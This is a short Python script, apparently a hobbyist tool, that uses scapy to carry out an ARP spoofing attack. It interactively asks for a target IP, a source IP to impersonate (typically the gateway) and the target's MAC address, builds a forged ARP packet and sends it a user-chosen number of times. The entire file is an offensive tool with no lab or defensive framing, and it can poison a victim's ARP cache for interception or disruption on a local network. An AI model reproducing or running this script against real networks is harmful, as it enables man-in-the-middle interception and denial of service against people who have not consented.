import os
from scapy.all import *
from scapy.all import ARP, Ether, srp
from art import *
from colorama import init, Fore, Back, Style


ctrl = "0"

# import ip
# ip.Scan_for_IP

k_command = input(Fore.GREEN + "You Want To Attack IP？ >>>")
k_command2 = input("What is the source IP address you want to spoof？(Typically A Gateway) >>> ")
arp_packet = ARP(pdst=k_command, psrc=k_command2)
k_command3 = input("The MAC Address Of The Target You Want To Attack Is？ >>> ")
eth_packet = Ether(dst=k_command3)
packet = eth_packet/arp_packet
# 发送ARP数据包

num_attacks = int(input(Fore.RED + "How many times do you want to attack? >>> "))
for i in range(num_attacks):
    send(packet)
